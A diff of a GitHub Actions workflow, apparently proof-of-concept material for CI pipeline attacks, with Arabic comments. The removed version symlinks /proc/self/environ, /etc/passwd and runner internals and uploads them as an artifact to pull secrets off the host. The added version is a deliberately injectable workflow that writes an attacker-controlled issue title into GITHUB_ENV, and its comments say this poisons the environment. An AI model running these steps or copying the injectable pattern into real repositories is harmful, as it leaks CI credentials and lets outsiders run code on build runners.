@@ -1,25 +1,20 @@
-name: Symlink Artifact Traversal Test
-on: [push]
+name: Process Issue Title
+on:
+  issues:
+    types: [opened]
+permissions:
+  issues: write
 jobs:
-  test:
+  process:
     runs-on: ubuntu-latest
     steps:
-      - name: Create Symlinks to Host Secrets
+      # [الثغرة هنا] الريبو يأخذ عنوان الـ Issue ويضعه في ملف GITHUB_ENV
+      - name: Save Issue Title to Env
         run: |
-          # 1. إنشاء وصلة رمزية تشير إلى متغيرات البيئة الخام (التي لم يتم عمل Masking لها)
-          ln -s /proc/self/environ raw_env_link
-          
-          # 2. إنشاء وصلة رمزية تشير إلى ملف passwd الخاص بنظام التشغيل المضيف
-          ln -s /etc/passwd host_passwd_link
-          
-          # 3. إنشاء وصلة رمزية تشير إلى مجلد الـ Runner الداخلي
-          ln -s /home/runner/runners runner_internals_link
-
-      - name: Upload Artifacts (Triggering the Traversal)
-        uses: actions/upload-artifact@v4
-        with:
-          name: host-secrets-via-yml
-          path: |
-            raw_env_link
-            host_passwd_link
-            runner_internals_link
+          echo "ISSUE_TITLE=${{ github.event.issue.title }}" >> $GITHUB_ENV
+      
+      # في هذه الخطوة، سيتم تنفيذ الكود الخبيث لأن البيئة تم تسممها
+      - name: Use Environment
+        run: |
+          echo "Processing issue: $ISSUE_TITLE"
+          echo "This step runs with the poisoned environment."
